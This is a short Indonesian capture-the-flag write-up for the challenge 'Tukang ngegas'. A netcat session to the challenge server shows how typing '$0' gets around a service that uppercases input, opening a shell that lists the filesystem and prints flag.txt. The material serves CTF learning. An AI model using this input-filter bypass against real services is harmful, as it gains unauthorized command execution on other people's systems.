## Tukang ngegas (100 pts)

Kita disuruh untuk connect pada ip dengan port berikut
`nc 13.76.181.86 8100`

Dan didapatkan hint `lokasi flag di flag.txt`

Ketika connect menggunakan netcat, bisa dilihat bahwa service ini mengubah semua command menjadi huruf besar, setelah *googling* cara execute bash shell, ternyata variable $0 dapat mengexecute bash, sehingga kita bisa mengetikkan command seperti biasa dan  mendapatkan flagnya

```bash
$ nc 13.76.181.86 8100
[!] Connecting to server..
[*] Switching to interactive mode
$ $0
ls
bin
boot
chall.py
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag.txt
Foresty2019{5a399860ecef529b27d390a1241dc688}
```